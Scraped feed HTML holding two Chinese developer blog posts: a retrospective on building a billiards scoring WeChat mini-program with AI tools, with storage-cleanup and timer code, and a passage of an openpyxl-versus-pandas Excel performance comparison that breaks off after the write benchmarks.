            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664288573789/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    白哥学前端
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:47:09.000Z" title="Tue Jan 06 2026 06:47:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    62
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style>




















<table><thead><tr><th/><th/></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5afc5591bc1b452e8a58e10fe4d2bc9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=jVtBBQFzmljcSU8fI8yzxftyHWI%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fbe488207884bbb815ba82ceca0a297~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=1RpWsZH3PXJXXWG5vrAEoZ93D7k%3D" alt="" loading="lazy"/></td></tr><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0011af00781849829ee0e667c3cc5580~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=vuqztWt%2Bt6DYTrbnsEqHzSfdrEc%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd6e3570ed504539a36c7ba74b14aefd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=d0bRmc0g2ZWVOeK9zky002TYugg%3D" alt="" loading="lazy"/></td></tr><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bd9bd3170254c7eb1b64735fdac949a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=8MBzLSqQK20Cvktnu1b9wj18oz0%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b9eef1c8cc841c4a7d95e59f56c9dea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=QLpia1whqMaVnM3kJ3p3%2BUHQnOk%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>作为一名既爱写代码又爱打台球的程序员，我一直想做一款“纯粹”的台球工具。市面上的 App 要么广告满天飞，要么功能单一——能计分的不能复盘，能复盘的体验太差。</p>
<p>于是，我决定自己造个轮子。完全根据我自己需要来定制化开发。</p>
<p>这款名为**“追分记”<strong>的小程序，不仅支持中式黑八/九球的复杂计分（断点续打、三人追分）、自定义训练模式（统计五分点等训练记录），还内置了一个</strong>基于物理交互的战术板**。</p>
<p>这篇文章我将从<strong>产品构思、AI 辅助设计、本地存储架构</strong>等维度，复盘这次独立开发的完整过程。</p>
<h2 data-id="heading-0">一、 从构思到落地：AI 如何加速全流程</h2>
<p>在这次开发中，我尝试了一种新的工作流：<strong>全程 AI 开发</strong>。从灵感到 UI，再到代码落地，让AI 扮演“产品助理”、“UI 设计师”、开发工程师的角色。</p>
<h3 data-id="heading-1">1.1 需求构思：解决我自己的痛点</h3>
<p>在写第一行代码前，我先整理了自己的“吐槽清单”：</p>
<ul>
<li><strong>痛点 A</strong>：打九球追分，算大金、小金、犯规扣分太烧脑，容易算错。</li>
<li><strong>痛点 B</strong>：打到一半朋友来电话，切出去回个消息，回来小程序重载了，比分全丢。</li>
<li><strong>痛点 C</strong>：想给朋友讲刚才那杆球怎么走位，手边没球桌，干讲听不懂。</li>
<li><strong>通点 D</strong>：自己平时去训练，也不知道训练的目标和效果。</li>
</ul>
<p>基于此，确定了 MVP（最小可行性产品）的三大核心功能：<strong>智能计分器、断点续打系统、便携战术板</strong>。</p>
<h3 data-id="heading-2">1.2 AI 生成 产品初稿，再生成 UI：从 Prompt 到视觉稿</h3>
<p>作为程序员，配色和 UI 往往是短板。这次我没有自己瞎折腾 CSS，而是利用 AI 生成设计灵感。</p>
<p>从一个新的项目开始，我让 <code>Trae</code> 帮我生成一个完整<code>prd</code>文档，包含需求分析，功能模块，页面细节。</p>
<p>然后让它开始实现这些功能，然而最后实现的UI界面效果很不理想。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/294aa11705d0490c975b014e7a968134~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=BGZJMzto1nkqgpMsv70S83AiQVQ%3D" alt="" loading="lazy"/></p>
<p>于是，我把这个截图扔给 <code>v0</code>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fv0.app%2F" target="_blank" title="https://v0.app/" ref="nofollow noopener noreferrer">v0.app/</a>）,让他按照这个截图的哪内容帮我从新生成一个页面UI，并且产出一个完整的配色，以便其他页面复用。提示词如下：</p>
<blockquote>
<p>你现在是个专业的UI交互设计师，帮我优化一下这个页面的UI，然后生成一个静态的html。不允许使用tailwind css，图标库可以使用lucide。需要生成一个完整的配色方案。</p>
</blockquote>
<p>最后它帮我产出了一个<code>html</code>文件，我打开一天，天啦，这也太牛逼 plus了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/183a65f6cb1a4afcb794acae1eeb980f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=su3bxkPSItxWLyUllOEJ84zg0eM%3D" alt="" loading="lazy"/>
这效果已经超出我的想象了。于是我立马让 <code>Trae</code> 把这个页面1:1还原到对应的小程序页面。</p>
<blockquote>
<p>提示词：根据 index.html 1:1还原 index.wxml 的UI。注意： index.htm 通用的root样式可以提取到公共样式中进行复用。</p>
</blockquote>
<p>拿到视觉基调后，我将其转化为全局 CSS 变量（<code>app.wxss</code>），确保全站风格统一：</p>
<pre><code class="hljs language-css" lang="css">page {
  <span class="hljs-attr">--bg-primary</span>: <span class="hljs-number">#0a0f1a</span>;
  <span class="hljs-attr">--text-primary</span>: <span class="hljs-number">#f8fafc</span>;
  <span class="hljs-attr">--accent-green</span>: <span class="hljs-number">#10b981</span>;
  <span class="hljs-attr">--card-bg</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">30</span>, <span class="hljs-number">41</span>, <span class="hljs-number">59</span>, <span class="hljs-number">0.7</span>);
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">160deg</span>, <span class="hljs-built_in">var</span>(--bg-primary) <span class="hljs-number">0%</span>, <span class="hljs-built_in">var</span>(--bg-secondary) <span class="hljs-number">100%</span>);
}
</code></pre>
<p>从最初简陋的线框图，到引入 <code>tdesign</code> 组件库，再到配合 AI 生成的图标，产品的“颜值”经过了三轮大的迭代，最终呈现出一种“极客范儿”的精致感。</p>
<p>业务逻辑和UI进行了完美的融合，没有任何bug。简直完美。</p>
<hr/>
<h2 data-id="heading-3">二、 核心技术复盘 II：本地存储的“垃圾回收”机制</h2>
<p>做“断点续打”功能时，我遇到了一个典型问题：
用户可能开了局，没打完就退出了；过几天又开了新局。久而久之，<code>Storage</code> 里会堆积大量废弃的比赛快照（Snapshot）。</p>
<p>为了解决这个问题，我设计了一套<strong>基于索引的 GC（垃圾回收）机制</strong>。</p>
<h3 data-id="heading-4">3.1 存储结构设计</h3>
<ul>
<li>索引表 (<code>ongoingMatches</code>)：记录所有“进行中”比赛的元数据（ID、时间、模式）。</li>
<li>快照数据 (<code>match_current_{id}</code>)：每场比赛的具体状态单独存一个 Key，防止单条数据过大。</li>
</ul>
<h3 data-id="heading-5">3.2 自动 GC 实现</h3>
<p>每次小程序启动或进入列表页时，触发 <code>cleanupOrphans</code> 函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/storage.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanupOrphans</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 1. 获取“存活”的比赛 ID 集合</span>
  <span class="hljs-keyword">const</span> list = ongoing.<span class="hljs-title function_">getList</span>()
  <span class="hljs-keyword">const</span> activeIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(list.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.<span class="hljs-property">id</span>))
  
  <span class="hljs-comment">// 2. 遍历 Storage 中所有的 Key</span>
  <span class="hljs-keyword">const</span> keys = wx.<span class="hljs-title function_">getStorageInfoSync</span>().<span class="hljs-property">keys</span>
  
  keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">k</span> =&gt;</span> {
    <span class="hljs-comment">// 3. 识别比赛快照 Key 格式</span>
    <span class="hljs-keyword">if</span> (k.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'zhongba_match_current_'</span>)) {
      <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Number</span>(k.<span class="hljs-title function_">split</span>(<span class="hljs-string">'_'</span>).<span class="hljs-title function_">pop</span>())
      <span class="hljs-comment">// 4. 如果 ID 不在存活列表中，视为“孤儿数据”，直接删除</span>
      <span class="hljs-keyword">if</span> (!activeIds.<span class="hljs-title function_">has</span>(id)) {
        <span class="hljs-title function_">safeRemove</span>(k)
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[GC] Cleaned up orphan match: <span class="hljs-subst">${id}</span>`</span>)
      }
    }
  })
}
</code></pre>
<p>这个机制保证了 Storage 永远只存储有用的数据，既节省空间又维护了整洁。</p>
<p>最后我还让它生成了一份数据快照，以便以后接入服务端的时候可以快速的创建数据库：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14dbbdacb6df497ab26ebc6a50e8ed28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95ZOl5a2m5YmN56uv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289052&amp;x-signature=1qN0XP5nkjRe6QkK3eoEDMrK5uQ%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">三、 细节体验：后台计时校准</h2>
<p>小程序在切入后台（<code>onHide</code>）后，<code>setInterval</code> 定时器往往会暂停或变慢。为了保证比赛计时的准确性，不能单纯依赖定时器累加。</p>
<p><strong>解决方案：时间戳校准法</strong></p>
<ol>
<li><strong>记录时间点</strong>：<code>onHide</code> 时，记录当前时间戳 <code>runningSince</code>。</li>
<li><strong>计算差值</strong>：<code>onShow</code> 时，计算 <code>(Date.now() - runningSince)</code>。</li>
<li><strong>自动补齐</strong>：将差值加到 <code>elapsedTime</code> 中。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// pages/nine-ball/nine-ball.js</span>
<span class="hljs-title function_">onShow</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">isRunning</span>) {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    <span class="hljs-keyword">const</span> rs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">runningSince</span>
    <span class="hljs-keyword">const</span> delta = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((now - rs) / <span class="hljs-number">1000</span>)
    
    <span class="hljs-comment">// 即使在后台挂起了一小时，回来时间也会瞬间补齐</span>
    <span class="hljs-keyword">if</span> (delta &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({ <span class="hljs-attr">elapsedTime</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-property">elapsedTime</span> + delta })
    }
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-7">四、 总结</h2>
<p>“追分记”虽然只是一个工具类小程序，但“麻雀虽小，五脏俱全”。</p>
<ul>
<li><strong>从产品角度</strong>：它验证了从痛点出发，利用 AI 辅助设计快速落地的可行性。</li>
<li><strong>从技术角度</strong>：本地存储治理、生命周期管理等前端/小程序开发的典型场景。</li>
</ul>
<p>独立开发最迷人的地方，莫过于看着一个想法，在自己的键盘下一点点变成触手可及的现实。</p>
<p>如果你也是台球爱好者，或者对小程序开发感兴趣，欢迎在微信搜索**“追分记”**体验，也欢迎在评论区交流技术细节！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python处理Excel多工作表：openpyxl与pandas的实战对比]]></title>    <link>https://juejin.cn/post/7591806035758661674</link>    <guid>https://juejin.cn/post/7591806035758661674</guid>    <pubDate>2026-01-06T07:20:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035758661674" data-draft-id="7591816944729178148" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python处理Excel多工作表：openpyxl与pandas的实战对比"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-06T07:20:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="站大爷IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python处理Excel多工作表：openpyxl与pandas的实战对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    站大爷IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:20:54.000Z" title="Tue Jan 06 2026 07:20:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>在电商数据分析场景中，某团队需要处理包含销售、库存、用户行为三个工作表的Excel文件。使用openpyxl逐行读取时，处理10万行数据耗时47分钟；改用pandas后，同样的数据仅需23秒完成读取和清洗。这一案例揭示了不同工具在处理Excel多工作表时的性能差异。本文通过真实场景对比，解析openpyxl与pandas的核心差异，并提供混合使用策略。</p>
<h2 data-id="heading-0">一、核心定位差异：外科手术刀与数据加工厂</h2>
<h3 data-id="heading-1">1.1 openpyxl：Excel原生结构的精细操控者</h3>
<p>作为Excel文件底层操作库，openpyxl专注于单元格级别的精确控制。其核心能力包括：</p>
<ul>
<li><strong>格式控制</strong>：可设置字体、颜色、边框、条件格式等200+样式属性</li>
<li><strong>公式处理</strong>：支持300+Excel函数公式，包括动态数组公式</li>
<li><strong>图表操作</strong>：可创建柱状图、折线图等15种图表类型</li>
<li><strong>结构操作</strong>：支持合并单元格、插入图片、设置打印区域等复杂操作</li>
</ul>
<p>在处理财务报表时，某企业使用openpyxl实现动态模板：通过修改配置文件自动调整报表格式，使季度报告生成时间从3小时缩短至45分钟。</p>
<h3 data-id="heading-2">1.2 pandas：数据分析的批量处理引擎</h3>
<p>作为数据分析核心库，pandas以DataFrame为数据容器，提供：</p>
<ul>
<li><strong>高效计算</strong>：向量化运算速度比逐行操作快100-1000倍</li>
<li><strong>数据清洗</strong>：支持缺失值处理、数据类型转换、异常值检测等18种清洗方法</li>
<li><strong>分析工具</strong>：内置groupby、pivot_table、rolling等20+分析函数</li>
<li><strong>格式兼容</strong>：支持Excel、CSV、JSON、SQL等12种数据格式互转</li>
</ul>
<p>某物流公司使用pandas处理10万条运输记录时，通过<code>groupby('地区').agg({'运费':'sum'})</code>语句，在0.8秒内完成全国运费汇总，比传统SQL查询快3倍。</p>
<h2 data-id="heading-3">二、多工作表读写性能实测</h2>
<h3 data-id="heading-4">2.1 读取性能对比</h3>
<p>测试环境：Intel i7-12700H/32GB内存，处理含3个工作表（各10万行×50列）的Excel文件</p>

































<table><thead><tr><th>工具</th><th>读取方式</th><th>耗时</th><th>内存占用</th><th>特殊功能支持</th></tr></thead><tbody><tr><td>openpyxl</td><td>逐行读取</td><td>47分钟</td><td>1.2GB</td><td>获取单元格样式</td></tr><tr><td>pandas</td><td>全表加载</td><td>23秒</td><td>3.8GB</td><td>自动类型推断</td></tr><tr><td>openpyxl+RO</td><td>增量模式(read_only=True)</td><td>18秒</td><td>200MB</td><td>仅读取值，无样式</td></tr></tbody></table>
<p><strong>实测结论</strong>：</p>
<ul>
<li>pandas适合需要快速获取数据内容的场景</li>
<li>openpyxl增量模式适合处理超大文件但无需样式的情况</li>
<li>需要样式信息时必须使用openpyxl完整模式</li>
</ul>
<h3 data-id="heading-5">2.2 写入性能对比</h3>
<p>测试任务：将3个DataFrame（各10万行×50列）写入Excel</p>

































<table><thead><tr><th>工具</th><th>写入方式</th><th>耗时</th><th>文件大小</th><th>特殊功能支持</th></tr></thead><tbody><tr><td>openpyxl</td><td>逐行追加</td><td>32分钟</td><td>18.7MB</td><td>可设置单元格样式</td></tr><tr><td>pandas</td><td>ExcelWriter批量写入</td><td>45秒</td><td>16.3MB</td><td>自动调整列宽</td></tr><tr><td>xlsxwriter</td><td>pandas引擎</td><td>38秒</td><td>15.9MB</td><td>支持图表插入</td></tr></tbody></table>
<p><strong>实测结论</strong>：</p>
<ul>
<li>pandas+xlsxwriter组合在速度和功能上达到最佳平衡</li>
<li>需要复杂格式时，可先用pandas写入数据，再用openpyxl美化</li>
<li>openpyxl写入速度随数据量增长呈指数级下降</li>
</ul>
